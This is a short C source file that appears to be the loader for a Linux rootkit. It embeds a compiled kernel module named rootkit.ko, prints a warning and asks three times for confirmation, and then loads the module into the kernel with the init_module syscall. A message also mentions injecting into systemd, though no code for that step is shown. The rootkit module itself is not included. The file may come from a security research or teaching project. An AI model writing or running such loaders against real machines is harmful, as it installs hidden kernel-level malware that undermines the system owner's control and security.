#include <linux/module.h>
#include <stdio.h>
#include <syscall.h>
#include <unistd.h>
#include "common.h"

extern const char _binary_rootkit_ko_start[];
extern const char _binary_rootkit_ko_end[];

int main()
{
    char yes;
    for (int i = 0; i < 3; i++) {
        puts(WARN
             "THIS WILL POTENTIALLY CAUSE IRREVERSIBLE DAMAGE TO THE SYSTEM");
        printf("Do you still want to do it? [y/n]: ");
        scanf(" %c", &yes);
        if (yes != 'y' && yes != 'Y')
            return 0;
    }
    puts(INFO "Start injecting module into systemd...");

    puts(INFO "Start loading kernel module...");
    if (syscall(SYS_init_module, _binary_rootkit_ko_start,
                _binary_rootkit_ko_end - _binary_rootkit_ko_start,
                (char[]){'\0'})) {
        puts(WARN "You are not root");
        return -1;
    }
    return 0;
}
